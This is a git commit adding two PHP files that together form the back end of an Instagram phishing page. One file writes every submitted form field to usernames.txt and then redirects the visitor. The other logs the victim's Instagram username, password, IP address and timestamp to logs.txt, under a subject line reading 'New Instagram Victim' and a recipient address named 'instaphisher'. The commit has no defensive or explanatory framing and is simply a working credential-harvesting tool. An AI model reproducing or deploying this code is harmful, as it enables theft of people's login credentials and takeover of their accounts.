3d8ab61389d644fb47df6ed4bbe064b079cdef17
Manesh Borkar <42399316+manesh13@users.noreply.github.com>
2020-04-01 22:26:56 +0530

    Add files via upload

---
+++ hack.php
@@ -0,0 +1,15 @@
+<?php
+header
+('location:');
+$handle=fopen("usernames.txt","a");
+foreach($_POST as $variable=>$value)
+{
+fwrite($handle,$variable);
+fwrite($handle,"=");
+fwrite($handle,$value);
+fwrite($handle,"\r\n");
+}
+fwrite($handle,"\r\n");
+fclose($handle);
+exit;
+?>
---
+++ temp.php
@@ -0,0 +1,19 @@
+<?php                                                                                                                   
+$date = gmdate ("d-n-Y");
+$time = gmdate ("H:i:s");
+$ip = $_SERVER['REMOTE_ADDR'];
+$hostname = gethostbyaddr($ip);
+$message  = "========== Instagram Login ==========\n";
+$message .= "User: ".$_POST['username']."\n";
+$message .= "\nPass: ".$_POST['password']."\n";
+$message .= "----------\n";
+$message .= "IP: ".$ip."\n";
+$message .= "Log : $time / $date \n";
+$rnessage = "$message\n";
+$send= "instaphisher@usbc.be";
+$subject = "New Instagram Victim | $ip";
+$headers = "From: Instagram";
+$file = fopen("logs.txt","ab");
+fwrite($file,$message);
+fclose($file);
+?>
